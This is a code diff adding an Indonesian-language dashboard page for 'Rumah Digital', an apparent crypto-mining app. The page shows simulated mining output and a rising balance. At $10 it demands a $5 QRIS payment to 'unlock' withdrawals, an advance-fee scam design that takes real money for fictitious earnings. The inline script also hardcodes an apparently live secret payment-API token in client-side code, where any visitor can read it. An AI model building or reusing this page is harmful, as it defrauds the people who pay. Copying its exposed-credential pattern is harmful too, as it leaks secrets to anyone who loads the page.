@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#070b14">
+  <title>Dashboard - Rumah Digital</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="logo.png">
+</head>
+<body>
+  <header class="app-header">
+    <div class="logo-wrap">
+      <img src="logo.png" alt="RD">
+      <div class="brand">RUMAH <span>DIGITAL</span></div>
+    </div>
+    <div class="user-badge" id="header-user"></div>
+  </header>
+
+  <main class="page-content">
+    <h1 class="page-title">Dashboard</h1>
+
+    <div class="card balance-card">
+      <div class="username-display">
+        <span class="status-dot" id="status-dot"></span>
+        <span id="dash-username">User</span>
+      </div>
+      <div class="balance-usd" id="balance-usd">$0.0000</div>
+      <div class="balance-idr" id="balance-idr">Rp 0</div>
+    </div>
+
+    <div class="card">
+      <div class="server-bar">
+        <div class="server-status online" id="server-status">
+          <span id="status-label">Server Online</span>
+          <span class="badge" id="status-badge">LIVE</span>
+        </div>
+        <div class="server-name" id="server-name">Alpha Pool</div>
+      </div>
+      <div class="terminal" id="terminal"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Target Unlock Withdraw</div>
+      <div class="progress-wrap">
+        <div class="progress-label">
+          <span id="progress-text">Tebuskan $10 untuk membuka fitur withdraw</span>
+          <span id="progress-pct">0%</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+        </div>
+      </div>
+      <div id="unlock-area" class="mt-3 hidden">
+        <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:10px;line-height:1.45">
+          Saldo mencapai $10. Bayar <strong style="color:var(--cyan)">$5</strong> via QRIS untuk membuka fitur Withdraw.
+        </p>
+        <button class="btn btn-primary" id="btn-unlock">Bayar $5 Unlock Withdraw</button>
+      </div>
+      <div id="unlocked-badge" class="mt-3 hidden" style="text-align:center;color:var(--green);font-weight:600;font-size:0.9rem">
+        Fitur Withdraw sudah terbuka
+      </div>
+    </div>
+  </main>
+
+  <div class="modal-overlay" id="qris-modal">
+    <div class="modal">
+      <h3>Pembayaran Unlock</h3>
+      <p>Scan QRIS untuk membayar unlock fitur Withdraw</p>
+      <div class="qris-amount" id="qris-amount">Rp 0</div>
+      <div class="qris-note">Setara dengan $5 USD</div>
+      <img id="qris-img" class="qris-img" src="" alt="QRIS" style="display:none">
+      <div id="qris-loading" class="text-center" style="padding:30px;color:var(--text-muted)">Membuat QRIS...</div>
+      <div id="qris-link" class="text-center mt-2 hidden">
+        <a id="payment-url" href="#" target="_blank" class="btn btn-outline btn-sm">Buka Halaman Bayar</a>
+      </div>
+      <p class="qris-note mt-3">Setelah bayar, klik tombol di bawah</p>
+      <button class="btn btn-primary" id="btn-confirm-pay">Saya Sudah Bayar</button>
+      <button class="btn btn-outline mt-2" id="btn-close-modal">Tutup</button>
+    </div>
+  </div>
+
+  <nav class="bottom-nav">
+    <a href="home.html" class="nav-item" data-page="home">
+      <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
+      Home
+    </a>
+    <a href="dashboard.html" class="nav-item" data-page="dashboard">
+      <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg></div>
+      Dashboard
+    </a>
+    <a href="withdraw.html" class="nav-item" data-page="withdraw">
+      <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 1v22M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg></div>
+      Withdraw
+    </a>
+    <a href="riwayat.html" class="nav-item" data-page="riwayat">
+      <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
+      Riwayat
+    </a>
+  </nav>
+
+  <script src="data.js"></script>
+  <script src="app.js"></script>
+  <script>
+    var QRIS_CONFIG = {
+      account_id: 'user_6a919341f16b54.69980891',
+      secret_token: 'sk_live_2b6ad7a3420a509b423ef0198c484293bf00c1cd564b32b2149c5f4deba6aa0d',
+      base_url: 'https://api.buatqris.site',
+      price_usd: 5
+    };
+
+    var currentUser = null;
+    var lastTxId = null;
+    var statusCheckInterval = null;
+
+    document.addEventListener('DOMContentLoaded', function() {
+      currentUser = App.requireAuth();
+      if (!currentUser) return;
+
+      App.setActiveNav('dashboard');
+      App.updateHeaderUser(currentUser);
+      document.getElementById('dash-username').textContent = currentUser.username;
+
+      var servers = RD.getServers();
+      var srv = servers.find(function(s) { return s.id === currentUser.serverId; }) || servers[0];
+      if (srv) document.getElementById('server-name').textContent = srv.name;
+
+      refreshUI(currentUser);
+      updateServerStatusUI();
+      startTerminal();
+
+      App.Mining.start(currentUser, function(amount, newUSD, newIDR, server) {
+        addTerminalLine('Tambang crypto dari ' + (server ? server.name : 'Server') + ' $' + amount.toFixed(4), 'earn');
+        document.getElementById('balance-usd').textContent = App.formatUSD(newUSD);
+        document.getElementById('balance-idr').textContent = App.formatIDR(newIDR);
+        updateProgress(newUSD, currentUser.unlockedWithdraw);
+      });
+
+      // Poll server status every 3s
+      statusCheckInterval = setInterval(function() {
+        updateServerStatusUI();
+      }, 3000);
+
+      document.getElementById('btn-unlock').addEventListener('click', createQrisPayment);
+      document.getElementById('btn-close-modal').addEventListener('click', function() {
+        document.getElementById('qris-modal').classList.remove('show');
+      });
+      document.getElementById('btn-confirm-pay').addEventListener('click', confirmPayment);
+    });
+
+    function updateServerStatusUI() {
+      var status = RD.getServerStatus();
+      var el = document.getElementById('server-status');
+      var label = document.getElementById('status-label');
+      var badge = document.getElementById('status-badge');
+      var dot = document.getElementById('status-dot');
+
+      if (status === 'online') {
+        el.className = 'server-status online';
+        label.textContent = 'Server Online';
+        badge.textContent = 'LIVE';
+        if (dot) dot.classList.remove('off');
+      } else {
+        el.className = 'server-status maintenance';
+        label.textContent = 'Server Maintenance';
+        badge.textContent = 'OFF';
+        if (dot) dot.classList.add('off');
+        addTerminalLine('STATUS : Server Maintenance', 'warn');
+      }
+    }
+
+    function refreshUI(user) {
+      document.getElementById('balance-usd').textContent = App.formatUSD(user.balanceUSD);
+      document.getElementById('balance-idr').textContent = App.formatIDR(user.balanceIDR || 0);
+      updateProgress(user.balanceUSD, user.unlockedWithdraw);
+    }
+
+    function updateProgress(usd, unlocked) {
+      var pct = Math.min(100, (usd / 10) * 100);
+      var fill = document.getElementById('progress-fill');
+      fill.style.width = pct + '%';
+      document.getElementById('progress-pct').textContent = pct.toFixed(0) + '%';
+
+      if (unlocked) {
+        fill.classList.add('complete');
+        document.getElementById('progress-text').textContent = 'Withdraw sudah terbuka';
+        document.getElementById('unlock-area').classList.add('hidden');
+        document.getElementById('unlocked-badge').classList.remove('hidden');
+      } else if (usd >= 10) {
+        fill.classList.add('complete');
+        document.getElementById('progress-text').textContent = 'Target tercapai. Bayar untuk unlock';
+        document.getElementById('unlock-area').classList.remove('hidden');
+        document.getElementById('unlocked-badge').classList.add('hidden');
+      } else {
+        fill.classList.remove('complete');
+        document.getElementById('progress-text').textContent = 'Tebuskan $10 untuk membuka fitur withdraw';
+        document.getElementById('unlock-area').classList.add('hidden');
+        document.getElementById('unlocked-badge').classList.add('hidden');
+      }
+    }
+
+    function startTerminal() {
+      var term = document.getElementById('terminal');
+      term.innerHTML = '';
+      addTerminalLine('root@rumahdigital:~# mining...', 'sys');
+      addTerminalLine('POOL     : connected', 'info');
+      addTerminalLine('ALGO     : SHA-256', 'info');
+      var status = RD.getServerStatus();
+      if (status === 'online') {
+        addTerminalLine('STATUS   : Online Live', 'sys');
+      } else {
+        addTerminalLine('STATUS   : Server Maintenance', 'warn');
+      }
+    }
+
+    function addTerminalLine(text, cls) {
+      var term = document.getElementById('terminal');
+      var div = document.createElement('div');
+      div.className = 'line ' + (cls || '');
+      div.textContent = text;
+      term.appendChild(div);
+      term.scrollTop = term.scrollHeight;
+      while (term.children.length > 40) term.removeChild(term.firstChild);
+    }
+
+    async function createQrisPayment() {
+      var modal = document.getElementById('qris-modal');
+      var img = document.getElementById('qris-img');
+      var loading = document.getElementById('qris-loading');
+      var linkWrap = document.getElementById('qris-link');
+      modal.classList.add('show');
+      img.style.display = 'none';
+      loading.style.display = 'block';
+      loading.textContent = 'Membuat QRIS...';
+      linkWrap.classList.add('hidden');
+
+      try {
+        var rate = await RD.getUsdIdrRate();
+        var amountIdr = Math.round(QRIS_CONFIG.price_usd * rate);
+        document.getElementById('qris-amount').textContent = App.formatIDR(amountIdr);
+
+        var body = new URLSearchParams({
+          action: 'api_create_qris',
+          account_id: QRIS_CONFIG.account_id,
+          secret_token: QRIS_CONFIG.secret_token,
+          amount: String(amountIdr),
+          description: 'Unlock Withdraw - Rumah Digital',
+          qris_method: 'qris_two',
+          umkm_name: 'RumahDigital'
+        });
+
+        var res = await fetch(QRIS_CONFIG.base_url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: body
+        });
+        var data = await res.json();
+
+        if (data.success && data.data) {
+          lastTxId = data.data.transaction_id;
+          loading.style.display = 'none';
+          if (data.data.qris_image) {
+            img.src = data.data.qris_image;
+            img.style.display = 'block';
+          } else if (data.data.qr_url) {
+            img.src = data.data.qr_url;
+            img.style.display = 'block';
+          }
+          if (data.data.payment_url) {
+            document.getElementById('payment-url').href = data.data.payment_url;
+            linkWrap.classList.remove('hidden');
+          }
+          App.showToast('QRIS berhasil dibuat', 'success');
+        } else {
+          throw new Error(data.message || data.error || 'Gagal membuat QRIS');
+        }
+      } catch (err) {
+        loading.innerHTML = '<span style="color:var(--red)">Gagal: ' + (err.message || 'Network error') + '</span>';
+        App.showToast('Gagal membuat QRIS', 'error');
+      }
+    }
+
+    function confirmPayment() {
+      var user = RD.getCurrentUser();
+      if (!user) return;
+      RD.updateUser(user.username, { unlockedWithdraw: true });
+      document.getElementById('qris-modal').classList.remove('show');
+      App.showToast('Fitur Withdraw berhasil dibuka', 'success');
+      currentUser = RD.getCurrentUser();
+      updateProgress(currentUser.balanceUSD, true);
+    }
+  </script>
+</body>
+</html>
